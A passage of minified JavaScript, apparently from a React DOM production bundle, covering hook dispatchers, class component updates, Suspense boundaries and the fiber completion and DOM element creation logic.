i=e.alternate;if(e.lanes===0&&(i===null||i.lanes===0)&&(i=n.lastRenderedReducer,i!==null))try{var a=n.lastRenderedState,l=i(a,t);if(r.hasEagerState=!0,r.eagerState=l,Ke(l,a)){var o=n.interleaved;o===null?(r.next=r,Il(n)):(r.next=o.next,o.next=r),n.interleaved=r;return}}catch{}finally{}t=gp(e,n,r,s),t!==null&&(r=ke(),Xe(t,e,s,r),Dp(t,n,s))}}function Ip(e){var n=e.alternate;return e===Z||n!==null&&n===Z}function zp(e,n){hs=Xr=!0;var t=e.pending;t===null?n.next=n:(n.next=t.next,t.next=n),e.pending=n}function Dp(e,n,t){if(t&4194240){var s=n.lanes;s&=e.pendingLanes,t|=s,n.lanes=t,bl(e,t)}}var Kr={readContext:Fe,useCallback:me,useContext:me,useEffect:me,useImperativeHandle:me,useInsertionEffect:me,useLayoutEffect:me,useMemo:me,useReducer:me,useRef:me,useState:me,useDebugValue:me,useDeferredValue:me,useTransition:me,useMutableSource:me,useSyncExternalStore:me,useId:me,unstable_isNewReconciler:!1},Jf={readContext:Fe,useCallback:function(e,n){return Je().memoizedState=[e,n===void 0?null:n],e},useContext:Fe,useEffect:sc,useImperativeHandle:function(e,n,t){return t=t!=null?t.concat([e]):null,Sr(4194308,4,Ap.bind(null,n,e),t)},useLayoutEffect:function(e,n){return Sr(4194308,4,e,n)},useInsertionEffect:function(e,n){return Sr(4,2,e,n)},useMemo:function(e,n){var t=Je();return n=n===void 0?null:n,e=e(),t.memoizedState=[e,n],e},useReducer:function(e,n,t){var s=Je();return n=t!==void 0?t(n):n,s.memoizedState=s.baseState=n,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:e,lastRenderedState:n},s.queue=e,e=e.dispatch=Qf.bind(null,Z,e),[s.memoizedState,e]},useRef:function(e){var n=Je();return e={current:e},n.memoizedState=e},useState:tc,useDebugValue:Wl,useDeferredValue:function(e){return Je().memoizedState=e},useTransition:function(){var e=tc(!1),n=e[0];return e=Kf.bind(null,e[1]),Je().memoizedState=e,[n,e]},useMutableSource:function(){},useSyncExternalStore:function(e,n,t){var s=Z,r=Je();if(K){if(t===void 0)throw Error(A(407));t=t()}else{if(t=n(),pe===null)throw Error(A(349));rt&30||bp(s,n,t)}r.memoizedState=t;var i={value:t,getSnapshot:n};return r.queue=i,sc(Sp.bind(null,s,i,e),[e]),s.flags|=2048,Rs(9,xp.bind(null,s,i,t,n),void 0,null),t},useId:function(){var e=Je(),n=pe.identifierPrefix;if(K){var t=un,s=cn;t=(s&~(1<<32-qe(s)-1)).toString(32)+t,n=":"+n+"R"+t,t=Ls++,0<t&&(n+="H"+t.toString(32)),n+=":"}else t=Xf++,n=":"+n+"r"+t.toString(32)+":";return e.memoizedState=n},unstable_isNewReconciler:!1},em={readContext:Fe,useCallback:Np,useContext:Fe,useEffect:Vl,useImperativeHandle:Lp,useInsertionEffect:Cp,useLayoutEffect:Pp,useMemo:Rp,useReducer:Xi,useRef:Tp,useState:function(){return Xi(Ns)},useDebugValue:Wl,useDeferredValue:function(e){var n=Ue();return Op(n,ae.memoizedState,e)},useTransition:function(){var e=Xi(Ns)[0],n=Ue().memoizedState;return[e,n]},useMutableSource:wp,useSyncExternalStore:kp,useId:Mp,unstable_isNewReconciler:!1},nm={readContext:Fe,useCallback:Np,useContext:Fe,useEffect:Vl,useImperativeHandle:Lp,useInsertionEffect:Cp,useLayoutEffect:Pp,useMemo:Rp,useReducer:Ki,useRef:Tp,useState:function(){return Ki(Ns)},useDebugValue:Wl,useDeferredValue:function(e){var n=Ue();return ae===null?n.memoizedState=e:Op(n,ae.memoizedState,e)},useTransition:function(){var e=Ki(Ns)[0],n=Ue().memoizedState;return[e,n]},useMutableSource:wp,useSyncExternalStore:kp,useId:Mp,unstable_isNewReconciler:!1};function We(e,n){if(e&&e.defaultProps){n=J({},n),e=e.defaultProps;for(var t in e)n[t]===void 0&&(n[t]=e[t]);return n}return n}function Ia(e,n,t,s){n=e.memoizedState,t=t(s,n),t=t==null?n:J({},n,t),e.memoizedState=t,e.lanes===0&&(e.updateQueue.baseState=t)}var yi={isMounted:function(e){return(e=e._reactInternals)?ct(e)===e:!1},enqueueSetState:function(e,n,t){e=e._reactInternals;var s=ke(),r=zn(e),i=dn(s,r);i.payload=n,t!=null&&(i.callback=t),n=Mn(e,i,r),n!==null&&(Xe(n,e,r,s),br(n,e,r))},enqueueReplaceState:function(e,n,t){e=e._reactInternals;var s=ke(),r=zn(e),i=dn(s,r);i.tag=1,i.payload=n,t!=null&&(i.callback=t),n=Mn(e,i,r),n!==null&&(Xe(n,e,r,s),br(n,e,r))},enqueueForceUpdate:function(e,n){e=e._reactInternals;var t=ke(),s=zn(e),r=dn(t,s);r.tag=2,n!=null&&(r.callback=n),n=Mn(e,r,s),n!==null&&(Xe(n,e,s,t),br(n,e,s))}};function rc(e,n,t,s,r,i,a){return e=e.stateNode,typeof e.shouldComponentUpdate=="function"?e.shouldComponentUpdate(s,i,a):n.prototype&&n.prototype.isPureReactComponent?!_s(t,s)||!_s(r,i):!0}function jp(e,n,t){var s=!1,r=Fn,i=n.contextType;return typeof i=="object"&&i!==null?i=Fe(i):(r=Ce(n)?tt:ve.current,s=n.contextTypes,i=(s=s!=null)?Mt(e,r):Fn),n=new n(t,i),e.memoizedState=n.state!==null&&n.state!==void 0?n.state:null,n.updater=yi,e.stateNode=n,n._reactInternals=e,s&&(e=e.stateNode,e.__reactInternalMemoizedUnmaskedChildContext=r,e.__reactInternalMemoizedMaskedChildContext=i),n}function ic(e,n,t,s){e=n.state,typeof n.componentWillReceiveProps=="function"&&n.componentWillReceiveProps(t,s),typeof n.UNSAFE_componentWillReceiveProps=="function"&&n.UNSAFE_componentWillReceiveProps(t,s),n.state!==e&&yi.enqueueReplaceState(n,n.state,null)}function za(e,n,t,s){var r=e.stateNode;r.props=t,r.state=e.memoizedState,r.refs={},zl(e);var i=n.contextType;typeof i=="object"&&i!==null?r.context=Fe(i):(i=Ce(n)?tt:ve.current,r.context=Mt(e,i)),r.state=e.memoizedState,i=n.getDerivedStateFromProps,typeof i=="function"&&(Ia(e,n,i,t),r.state=e.memoizedState),typeof n.getDerivedStateFromProps=="function"||typeof r.getSnapshotBeforeUpdate=="function"||typeof r.UNSAFE_componentWillMount!="function"&&typeof r.componentWillMount!="function"||(n=r.state,typeof r.componentWillMount=="function"&&r.componentWillMount(),typeof r.UNSAFE_componentWillMount=="function"&&r.UNSAFE_componentWillMount(),n!==r.state&&yi.enqueueReplaceState(r,r.state,null),Yr(e,t,r,s),r.state=e.memoizedState),typeof r.componentDidMount=="function"&&(e.flags|=4194308)}function jt(e,n){try{var t="",s=n;do t+=Ph(s),s=s.return;while(s);var r=t}catch(i){r=`
Error generating stack: `+i.message+`
`+i.stack}return{value:e,source:n,stack:r,digest:null}}function Qi(e,n,t){return{value:e,source:null,stack:t??null,digest:n??null}}function Da(e,n){try{console.error(n.value)}catch(t){setTimeout(function(){throw t})}}var tm=typeof WeakMap=="function"?WeakMap:Map;function Bp(e,n,t){t=dn(-1,t),t.tag=3,t.payload={element:null};var s=n.value;return t.callback=function(){Zr||(Zr=!0,Ya=s),Da(e,n)},t}function Fp(e,n,t){t=dn(-1,t),t.tag=3;var s=e.type.getDerivedStateFromError;if(typeof s=="function"){var r=n.value;t.payload=function(){return s(r)},t.callback=function(){Da(e,n)}}var i=e.stateNode;return i!==null&&typeof i.componentDidCatch=="function"&&(t.callback=function(){Da(e,n),typeof s!="function"&&(In===null?In=new Set([this]):In.add(this));var a=n.stack;this.componentDidCatch(n.value,{componentStack:a!==null?a:""})}),t}function ac(e,n,t){var s=e.pingCache;if(s===null){s=e.pingCache=new tm;var r=new Set;s.set(n,r)}else r=s.get(n),r===void 0&&(r=new Set,s.set(n,r));r.has(t)||(r.add(t),e=gm.bind(null,e,n,t),n.then(e,e))}function lc(e){do{var n;if((n=e.tag===13)&&(n=e.memoizedState,n=n!==null?n.dehydrated!==null:!0),n)return e;e=e.return}while(e!==null);return null}function oc(e,n,t,s,r){return e.mode&1?(e.flags|=65536,e.lanes=r,e):(e===n?e.flags|=65536:(e.flags|=128,t.flags|=131072,t.flags&=-52805,t.tag===1&&(t.alternate===null?t.tag=17:(n=dn(-1,1),n.tag=2,Mn(t,n,1))),t.lanes|=1),e)}var sm=vn.ReactCurrentOwner,_e=!1;function we(e,n,t,s){n.child=e===null?mp(n,null,t,s):zt(n,e.child,t,s)}function cc(e,n,t,s,r){t=t.render;var i=n.ref;return At(n,r),s=Ul(e,n,t,s,i,r),t=Hl(),e!==null&&!_e?(n.updateQueue=e.updateQueue,n.flags&=-2053,e.lanes&=~r,gn(e,n,r)):(K&&t&&Al(n),n.flags|=1,we(e,n,s,r),n.child)}function uc(e,n,t,s,r){if(e===null){var i=t.type;return typeof i=="function"&&!Zl(i)&&i.defaultProps===void 0&&t.compare===null&&t.defaultProps===void 0?(n.tag=15,n.type=i,Up(e,n,i,s,r)):(e=Cr(t.type,null,s,n,n.mode,r),e.ref=n.ref,e.return=n,n.child=e)}if(i=e.child,!(e.lanes&r)){var a=i.memoizedProps;if(t=t.compare,t=t!==null?t:_s,t(a,s)&&e.ref===n.ref)return gn(e,n,r)}return n.flags|=1,e=Dn(i,s),e.ref=n.ref,e.return=n,n.child=e}function Up(e,n,t,s,r){if(e!==null){var i=e.memoizedProps;if(_s(i,s)&&e.ref===n.ref)if(_e=!1,n.pendingProps=s=i,(e.lanes&r)!==0)e.flags&131072&&(_e=!0);else return n.lanes=e.lanes,gn(e,n,r)}return ja(e,n,t,s,r)}function Hp(e,n,t){var s=n.pendingProps,r=s.children,i=e!==null?e.memoizedState:null;if(s.mode==="hidden")if(!(n.mode&1))n.memoizedState={baseLanes:0,cachePool:null,transitions:null},Y(St,Ae),Ae|=t;else{if(!(t&1073741824))return e=i!==null?i.baseLanes|t:t,n.lanes=n.childLanes=1073741824,n.memoizedState={baseLanes:e,cachePool:null,transitions:null},n.updateQueue=null,Y(St,Ae),Ae|=e,null;n.memoizedState={baseLanes:0,cachePool:null,transitions:null},s=i!==null?i.baseLanes:t,Y(St,Ae),Ae|=s}else i!==null?(s=i.baseLanes|t,n.memoizedState=null):s=t,Y(St,Ae),Ae|=s;return we(e,n,r,t),n.child}function Vp(e,n){var t=n.ref;(e===null&&t!==null||e!==null&&e.ref!==t)&&(n.flags|=512,n.flags|=2097152)}function ja(e,n,t,s,r){var i=Ce(t)?tt:ve.current;return i=Mt(n,i),At(n,r),t=Ul(e,n,t,s,i,r),s=Hl(),e!==null&&!_e?(n.updateQueue=e.updateQueue,n.flags&=-2053,e.lanes&=~r,gn(e,n,r)):(K&&s&&Al(n),n.flags|=1,we(e,n,t,r),n.child)}function pc(e,n,t,s,r){if(Ce(t)){var i=!0;Hr(n)}else i=!1;if(At(n,r),n.stateNode===null)_r(e,n),jp(n,t,s),za(n,t,s,r),s=!0;else if(e===null){var a=n.stateNode,l=n.memoizedProps;a.props=l;var o=a.context,c=t.contextType;typeof c=="object"&&c!==null?c=Fe(c):(c=Ce(t)?tt:ve.current,c=Mt(n,c));var u=t.getDerivedStateFromProps,d=typeof u=="function"||typeof a.getSnapshotBeforeUpdate=="function";d||typeof a.UNSAFE_componentWillReceiveProps!="function"&&typeof a.componentWillReceiveProps!="function"||(l!==s||o!==c)&&ic(n,a,s,c),xn=!1;var h=n.memoizedState;a.state=h,Yr(n,s,a,r),o=n.memoizedState,l!==s||h!==o||Te.current||xn?(typeof u=="function"&&(Ia(n,t,u,s),o=n.memoizedState),(l=xn||rc(n,t,l,s,h,o,c))?(d||typeof a.UNSAFE_componentWillMount!="function"&&typeof a.componentWillMount!="function"||(typeof a.componentWillMount=="function"&&a.componentWillMount(),typeof a.UNSAFE_componentWillMount=="function"&&a.UNSAFE_componentWillMount()),typeof a.componentDidMount=="function"&&(n.flags|=4194308)):(typeof a.componentDidMount=="function"&&(n.flags|=4194308),n.memoizedProps=s,n.memoizedState=o),a.props=s,a.state=o,a.context=c,s=l):(typeof a.componentDidMount=="function"&&(n.flags|=4194308),s=!1)}else{a=n.stateNode,yp(e,n),l=n.memoizedProps,c=n.type===n.elementType?l:We(n.type,l),a.props=c,d=n.pendingProps,h=a.context,o=t.contextType,typeof o=="object"&&o!==null?o=Fe(o):(o=Ce(t)?tt:ve.current,o=Mt(n,o));var y=t.getDerivedStateFromProps;(u=typeof y=="function"||typeof a.getSnapshotBeforeUpdate=="function")||typeof a.UNSAFE_componentWillReceiveProps!="function"&&typeof a.componentWillReceiveProps!="function"||(l!==d||h!==o)&&ic(n,a,s,o),xn=!1,h=n.memoizedState,a.state=h,Yr(n,s,a,r);var k=n.memoizedState;l!==d||h!==k||Te.current||xn?(typeof y=="function"&&(Ia(n,t,y,s),k=n.memoizedState),(c=xn||rc(n,t,c,s,h,k,o)||!1)?(u||typeof a.UNSAFE_componentWillUpdate!="function"&&typeof a.componentWillUpdate!="function"||(typeof a.componentWillUpdate=="function"&&a.componentWillUpdate(s,k,o),typeof a.UNSAFE_componentWillUpdate=="function"&&a.UNSAFE_componentWillUpdate(s,k,o)),typeof a.componentDidUpdate=="function"&&(n.flags|=4),typeof a.getSnapshotBeforeUpdate=="function"&&(n.flags|=1024)):(typeof a.componentDidUpdate!="function"||l===e.memoizedProps&&h===e.memoizedState||(n.flags|=4),typeof a.getSnapshotBeforeUpdate!="function"||l===e.memoizedProps&&h===e.memoizedState||(n.flags|=1024),n.memoizedProps=s,n.memoizedState=k),a.props=s,a.state=k,a.context=o,s=c):(typeof a.componentDidUpdate!="function"||l===e.memoizedProps&&h===e.memoizedState||(n.flags|=4),typeof a.getSnapshotBeforeUpdate!="function"||l===e.memoizedProps&&h===e.memoizedState||(n.flags|=1024),s=!1)}return Ba(e,n,t,s,i,r)}function Ba(e,n,t,s,r,i){Vp(e,n);var a=(n.flags&128)!==0;if(!s&&!a)return r&&Ko(n,t,!1),gn(e,n,i);s=n.stateNode,sm.current=n;var l=a&&typeof t.getDerivedStateFromError!="function"?null:s.render();return n.flags|=1,e!==null&&a?(n.child=zt(n,e.child,null,i),n.child=zt(n,null,l,i)):we(e,n,l,i),n.memoizedState=s.state,r&&Ko(n,t,!0),n.child}function Wp(e){var n=e.stateNode;n.pendingContext?Xo(e,n.pendingContext,n.pendingContext!==n.context):n.context&&Xo(e,n.context,!1),Dl(e,n.containerInfo)}function dc(e,n,t,s,r){return It(),Nl(r),n.flags|=256,we(e,n,t,s),n.child}var Fa={dehydrated:null,treeContext:null,retryLane:0};function Ua(e){return{baseLanes:e,cachePool:null,transitions:null}}function $p(e,n,t){var s=n.pendingProps,r=Q.current,i=!1,a=(n.flags&128)!==0,l;if((l=a)||(l=e!==null&&e.memoizedState===null?!1:(r&2)!==0),l?(i=!0,n.flags&=-129):(e===null||e.memoizedState!==null)&&(r|=1),Y(Q,r&1),e===null)return Oa(n),e=n.memoizedState,e!==null&&(e=e.dehydrated,e!==null)?(n.mode&1?e.data==="$!"?n.lanes=8:n.lanes=1073741824:n.lanes=1,null):(a=s.children,e=s.fallback,i?(s=n.mode,i=n.child,a={mode:"hidden",children:a},!(s&1)&&i!==null?(i.childLanes=0,i.pendingProps=a):i=ki(a,s,0,null),e=et(e,s,t,null),i.return=n,e.return=n,i.sibling=e,n.child=i,n.child.memoizedState=Ua(t),n.memoizedState=Fa,e):$l(n,a));if(r=e.memoizedState,r!==null&&(l=r.dehydrated,l!==null))return rm(e,n,a,s,l,r,t);if(i){i=s.fallback,a=n.mode,r=e.child,l=r.sibling;var o={mode:"hidden",children:s.children};return!(a&1)&&n.child!==r?(s=n.child,s.childLanes=0,s.pendingProps=o,n.deletions=null):(s=Dn(r,o),s.subtreeFlags=r.subtreeFlags&14680064),l!==null?i=Dn(l,i):(i=et(i,a,t,null),i.flags|=2),i.return=n,s.return=n,s.sibling=i,n.child=s,s=i,i=n.child,a=e.child.memoizedState,a=a===null?Ua(t):{baseLanes:a.baseLanes|t,cachePool:null,transitions:a.transitions},i.memoizedState=a,i.childLanes=e.childLanes&~t,n.memoizedState=Fa,s}return i=e.child,e=i.sibling,s=Dn(i,{mode:"visible",children:s.children}),!(n.mode&1)&&(s.lanes=t),s.return=n,s.sibling=null,e!==null&&(t=n.deletions,t===null?(n.deletions=[e],n.flags|=16):t.push(e)),n.child=s,n.memoizedState=null,s}function $l(e,n){return n=ki({mode:"visible",children:n},e.mode,0,null),n.return=e,e.child=n}function or(e,n,t,s){return s!==null&&Nl(s),zt(n,e.child,null,t),e=$l(n,n.pendingProps.children),e.flags|=2,n.memoizedState=null,e}function rm(e,n,t,s,r,i,a){if(t)return n.flags&256?(n.flags&=-257,s=Qi(Error(A(422))),or(e,n,a,s)):n.memoizedState!==null?(n.child=e.child,n.flags|=128,null):(i=s.fallback,r=n.mode,s=ki({mode:"visible",children:s.children},r,0,null),i=et(i,r,a,null),i.flags|=2,s.return=n,i.return=n,s.sibling=i,n.child=s,n.mode&1&&zt(n,e.child,null,a),n.child.memoizedState=Ua(a),n.memoizedState=Fa,i);if(!(n.mode&1))return or(e,n,a,null);if(r.data==="$!"){if(s=r.nextSibling&&r.nextSibling.dataset,s)var l=s.dgst;return s=l,i=Error(A(419)),s=Qi(i,s,void 0),or(e,n,a,s)}if(l=(a&e.childLanes)!==0,_e||l){if(s=pe,s!==null){switch(a&-a){case 4:r=2;break;case 16:r=8;break;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:r=32;break;case 536870912:r=268435456;break;default:r=0}r=r&(s.suspendedLanes|a)?0:r,r!==0&&r!==i.retryLane&&(i.retryLane=r,mn(e,r),Xe(s,e,r,-1))}return Ql(),s=Qi(Error(A(421))),or(e,n,a,s)}return r.data==="$?"?(n.flags|=128,n.child=e.child,n=ym.bind(null,e),r._reactRetry=n,null):(e=i.treeContext,Le=On(r.nextSibling),Ne=n,K=!0,Ge=null,e!==null&&(ze[De++]=cn,ze[De++]=un,ze[De++]=st,cn=e.id,un=e.overflow,st=n),n=$l(n,s.children),n.flags|=4096,n)}function hc(e,n,t){e.lanes|=n;var s=e.alternate;s!==null&&(s.lanes|=n),Ma(e.return,n,t)}function Zi(e,n,t,s,r){var i=e.memoizedState;i===null?e.memoizedState={isBackwards:n,rendering:null,renderingStartTime:0,last:s,tail:t,tailMode:r}:(i.isBackwards=n,i.rendering=null,i.renderingStartTime=0,i.last=s,i.tail=t,i.tailMode=r)}function Gp(e,n,t){var s=n.pendingProps,r=s.revealOrder,i=s.tail;if(we(e,n,s.children,t),s=Q.current,s&2)s=s&1|2,n.flags|=128;else{if(e!==null&&e.flags&128)e:for(e=n.child;e!==null;){if(e.tag===13)e.memoizedState!==null&&hc(e,t,n);else if(e.tag===19)hc(e,t,n);else if(e.child!==null){e.child.return=e,e=e.child;continue}if(e===n)break e;for(;e.sibling===null;){if(e.return===null||e.return===n)break e;e=e.return}e.sibling.return=e.return,e=e.sibling}s&=1}if(Y(Q,s),!(n.mode&1))n.memoizedState=null;else switch(r){case"forwards":for(t=n.child,r=null;t!==null;)e=t.alternate,e!==null&&qr(e)===null&&(r=t),t=t.sibling;t=r,t===null?(r=n.child,n.child=null):(r=t.sibling,t.sibling=null),Zi(n,!1,r,t,i);break;case"backwards":for(t=null,r=n.child,n.child=null;r!==null;){if(e=r.alternate,e!==null&&qr(e)===null){n.child=r;break}e=r.sibling,r.sibling=t,t=r,r=e}Zi(n,!0,t,null,i);break;case"together":Zi(n,!1,null,null,void 0);break;default:n.memoizedState=null}return n.child}function _r(e,n){!(n.mode&1)&&e!==null&&(e.alternate=null,n.alternate=null,n.flags|=2)}function gn(e,n,t){if(e!==null&&(n.dependencies=e.dependencies),it|=n.lanes,!(t&n.childLanes))return null;if(e!==null&&n.child!==e.child)throw Error(A(153));if(n.child!==null){for(e=n.child,t=Dn(e,e.pendingProps),n.child=t,t.return=n;e.sibling!==null;)e=e.sibling,t=t.sibling=Dn(e,e.pendingProps),t.return=n;t.sibling=null}return n.child}function im(e,n,t){switch(n.tag){case 3:Wp(n),It();break;case 5:vp(n);break;case 1:Ce(n.type)&&Hr(n);break;case 4:Dl(n,n.stateNode.containerInfo);break;case 10:var s=n.type._context,r=n.memoizedProps.value;Y($r,s._currentValue),s._currentValue=r;break;case 13:if(s=n.memoizedState,s!==null)return s.dehydrated!==null?(Y(Q,Q.current&1),n.flags|=128,null):t&n.child.childLanes?$p(e,n,t):(Y(Q,Q.current&1),e=gn(e,n,t),e!==null?e.sibling:null);Y(Q,Q.current&1);break;case 19:if(s=(t&n.childLanes)!==0,e.flags&128){if(s)return Gp(e,n,t);n.flags|=128}if(r=n.memoizedState,r!==null&&(r.rendering=null,r.tail=null,r.lastEffect=null),Y(Q,Q.current),s)break;return null;case 22:case 23:return n.lanes=0,Hp(e,n,t)}return gn(e,n,t)}var Yp,Ha,qp,Xp;Yp=function(e,n){for(var t=n.child;t!==null;){if(t.tag===5||t.tag===6)e.appendChild(t.stateNode);else if(t.tag!==4&&t.child!==null){t.child.return=t,t=t.child;continue}if(t===n)break;for(;t.sibling===null;){if(t.return===null||t.return===n)return;t=t.return}t.sibling.return=t.return,t=t.sibling}};Ha=function(){};qp=function(e,n,t,s){var r=e.memoizedProps;if(r!==s){e=n.stateNode,Qn(tn.current);var i=null;switch(t){case"input":r=ua(e,r),s=ua(e,s),i=[];break;case"select":r=J({},r,{value:void 0}),s=J({},s,{value:void 0}),i=[];break;case"textarea":r=ha(e,r),s=ha(e,s),i=[];break;default:typeof r.onClick!="function"&&typeof s.onClick=="function"&&(e.onclick=Fr)}ma(t,s);var a;t=null;for(c in r)if(!s.hasOwnProperty(c)&&r.hasOwnProperty(c)&&r[c]!=null)if(c==="style"){var l=r[c];for(a in l)l.hasOwnProperty(a)&&(t||(t={}),t[a]="")}else c!=="dangerouslySetInnerHTML"&&c!=="children"&&c!=="suppressContentEditableWarning"&&c!=="suppressHydrationWarning"&&c!=="autoFocus"&&(ys.hasOwnProperty(c)?i||(i=[]):(i=i||[]).push(c,null));for(c in s){var o=s[c];if(l=r!=null?r[c]:void 0,s.hasOwnProperty(c)&&o!==l&&(o!=null||l!=null))if(c==="style")if(l){for(a in l)!l.hasOwnProperty(a)||o&&o.hasOwnProperty(a)||(t||(t={}),t[a]="");for(a in o)o.hasOwnProperty(a)&&l[a]!==o[a]&&(t||(t={}),t[a]=o[a])}else t||(i||(i=[]),i.push(c,t)),t=o;else c==="dangerouslySetInnerHTML"?(o=o?o.__html:void 0,l=l?l.__html:void 0,o!=null&&l!==o&&(i=i||[]).push(c,o)):c==="children"?typeof o!="string"&&typeof o!="number"||(i=i||[]).push(c,""+o):c!=="suppressContentEditableWarning"&&c!=="suppressHydrationWarning"&&(ys.hasOwnProperty(c)?(o!=null&&c==="onScroll"&&q("scroll",e),i||l===o||(i=[])):(i=i||[]).push(c,o))}t&&(i=i||[]).push("style",t);var c=i;(n.updateQueue=c)&&(n.flags|=4)}};Xp=function(e,n,t,s){t!==s&&(n.flags|=4)};function Zt(e,n){if(!K)switch(e.tailMode){case"hidden":n=e.tail;for(var t=null;n!==null;)n.alternate!==null&&(t=n),n=n.sibling;t===null?e.tail=null:t.sibling=null;break;case"collapsed":t=e.tail;for(var s=null;t!==null;)t.alternate!==null&&(s=t),t=t.sibling;s===null?n||e.tail===null?e.tail=null:e.tail.sibling=null:s.sibling=null}}function ge(e){var n=e.alternate!==null&&e.alternate.child===e.child,t=0,s=0;if(n)for(var r=e.child;r!==null;)t|=r.lanes|r.childLanes,s|=r.subtreeFlags&14680064,s|=r.flags&14680064,r.return=e,r=r.sibling;else for(r=e.child;r!==null;)t|=r.lanes|r.childLanes,s|=r.subtreeFlags,s|=r.flags,r.return=e,r=r.sibling;return e.subtreeFlags|=s,e.childLanes=t,n}function am(e,n,t){var s=n.pendingProps;switch(Ll(n),n.tag){case 2:case 16:case 15:case 0:case 11:case 7:case 8:case 12:case 9:case 14:return ge(n),null;case 1:return Ce(n.type)&&Ur(),ge(n),null;case 3:return s=n.stateNode,Dt(),X(Te),X(ve),Bl(),s.pendingContext&&(s.context=s.pendingContext,s.pendingContext=null),(e===null||e.child===null)&&(ar(n)?n.flags|=4:e===null||e.memoizedState.isDehydrated&&!(n.flags&256)||(n.flags|=1024,Ge!==null&&(Ka(Ge),Ge=null))),Ha(e,n),ge(n),null;case 5:jl(n);var r=Qn(As.current);if(t=n.type,e!==null&&n.stateNode!=null)qp(e,n,t,s,r),e.ref!==n.ref&&(n.flags|=512,n.flags|=2097152);else{if(!s){if(n.stateNode===null)throw Error(A(166));return ge(n),null}if(e=Qn(tn.current),ar(n)){s=n.stateNode,t=n.type;var i=n.memoizedProps;switch(s[en]=n,s[Cs]=i,e=(n.mode&1)!==0,t){case"dialog":q("cancel",s),q("close",s);break;case"iframe":case"object":case"embed":q("load",s);break;case"video":case"audio":for(r=0;r<is.length;r++)q(is[r],s);break;case"source":q("error",s);break;case"img":case"image":case"link":q("error",s),q("load",s);break;case"details":q("toggle",s);break;case"input":xo(s,i),q("invalid",s);break;case"select":s._wrapperState={wasMultiple:!!i.multiple},q("invalid",s);break;case"textarea":_o(s,i),q("invalid",s)}ma(t,i),r=null;for(var a in i)if(i.hasOwnProperty(a)){var l=i[a];a==="children"?typeof l=="string"?s.textContent!==l&&(i.suppressHydrationWarning!==!0&&ir(s.textContent,l,e),r=["children",l]):typeof l=="number"&&s.textContent!==""+l&&(i.suppressHydrationWarning!==!0&&ir(s.textContent,l,e),r=["children",""+l]):ys.hasOwnProperty(a)&&l!=null&&a==="onScroll"&&q("scroll",s)}switch(t){case"input":Qs(s),So(s,i,!0);break;case"textarea":Qs(s),Eo(s);break;case"select":case"option":break;default:typeof i.onClick=="function"&&(s.onclick=Fr)}s=r,n.updateQueue=s,s!==null&&(n.flags|=4)}else{a=r.nodeType===9?r:r.ownerDocument,e==="http://www.w3.org/1999/xhtml"&&(e=Su(t)),e==="http://www.w3.org/1999/xhtml"?t==="script"?(e=a.createElement("div"),e.innerHTML="<script><\/script>",e=e.removeChild(e.firstChild)):typeof s.is=="string"?e=a.createElement(t,{is:s.is}):(e=a.createElement(t),t==="select"&&(a=e,s.multiple?a.multiple=!0:s.size&&(a.size=s.size))):e=a.createElementNS(e,t),e[en]=n,e[Cs]=s,Yp(e,n,!1,!1),n.stateNode=e;e:{switch(a=ga(t,s),t){case"dialog":q("cancel",e),q("close",e),r=s;break;case"iframe":case"object":case"embed":q("load",e),r=s;break;case"video":case"audio":for(r=0;r<is.length;r++)q(is[r],e);r=s;break;case"source":q("error",e),r=s;break;case"img":case"image":case"link":q("error",e),q("load",e),r=s;break;case"details":q("toggle",e),r=s;break;case"input":xo(e,s),r=ua(e,s),q("invalid",e);break;case"option":r=s;break;case"select":e._wrapperState={wasMultiple:!!s.multiple},r=J({},s,{value:void 0}),q("invalid",e);break;case"textarea":_o(e,s),r=ha(e,s),q("invalid",e);break;default:r=s}ma(t,r),l=r;for(i in l)if(l.hasOwnProperty(i)){var o=l[i];i==="style"?Tu(e,o):i==="dangerouslySetInnerHTML"?(o=o?o.__html:void 0,o!=null&&_u(e,o)):i==="children"?typeof o=="string"?(t!=="textarea"||o!=="")&&vs(e,o):typeof o=="number"&&vs(e,""+o):i!=="suppressContentEditableWarning"&&i!=="suppressHydrationWarning"&&i!=="autoFocus"&&(ys.hasOwnProperty(i)?o!=null&&i==="onScroll"&&q("scroll",e):o!=null&&ml(e,i,o,a))}switch(t){case"input":Qs(e),So(e,s,!1);break;case"textarea":Qs(e),Eo(e);break;case"option":s.value!=null&&e.setAttribute("value",""+Bn(s.value));break;case"select":e.multiple=!!s.multiple,i=s.value,i!=null?Et(e,!!s.multiple,i,!1):s.defaultValue!=null&&Et(e,!!s.multiple,s.defaultValue,!0);break;default:typeof r.onClick=="function"&&(e.onclick=Fr)}switch(t){case"button":case"input":case"select":case"textarea":s=!!s.autoFocus;break e;case"img":s=!0;break e;default:s=!1}}s&&(n.flags|=4)}n.ref!==null&&(n.flags|=512,n.flags|=2097152)}return ge(n),null;case 6:if(e&&n.stateNode!=null)Xp(e,n,e.memoizedProps,s);else{if(typeof s!="string"&&n.stateNode===null)throw Error(A(166));if(t=Qn(As.current),Qn(tn.current),ar(n)){if(s=n.stateNode,t=n.memoizedProps,s[en]=n,(i=s.nodeValue!==t)&&(e=Ne,e!==null))switch(e.tag){case 3:ir(s.nodeValue,t,(e.mode&1)!==0);break;case 5:e.memoizedProps.suppressHydrationWarning!==!0&&ir(s.nodeValue,t,(e.mode&1)!==0)}i&&(n.flags|=4)}else s=(t.nodeType===9?t:t.ownerDocument).createTextNode(s),s[en]=n,n.stateNode=s}return ge(n),null;case 13:if(X(Q),s=n.memoizedState,e===null||e.memoizedState!==null&&e.memoizedState.dehydrated!==null){if(K&&Le!==null&&n.mode&1&&!(n.flags&128))hp(),It(),n.flags|=98560,i=!1;else if(i=ar(n),s!==null&&s.dehydrated!==null){if(e===null){if(!i)throw Error(A(318));if(i=n.memoizedState,i=i!==null?i.dehydrated:null,!i)throw Error(A(317));i[en]=n}else It(),!(n.flags&128)&&(n.memoizedState=null),n.flags|=4;ge(n),i=!1}else Ge!==null&&(Ka(Ge),Ge=null),i=!0;if(!i)return n.flags&65536?n:null}return n.flags&128?(n.lanes=t,n):(s=s!==null,s!==(e!==null&&e.memoizedState!==null)&&s&&(n.child.flags|=8192,n.mode&1&&(e===null||Q.current&1?le===0&&(le=3):Ql())),n.updateQueue!==null&&(n.flags|=4),ge(n),null);case 4:return Dt(),Ha(e,n),e===null&&Es(n.stateNode.containerInfo),ge(n),null;case 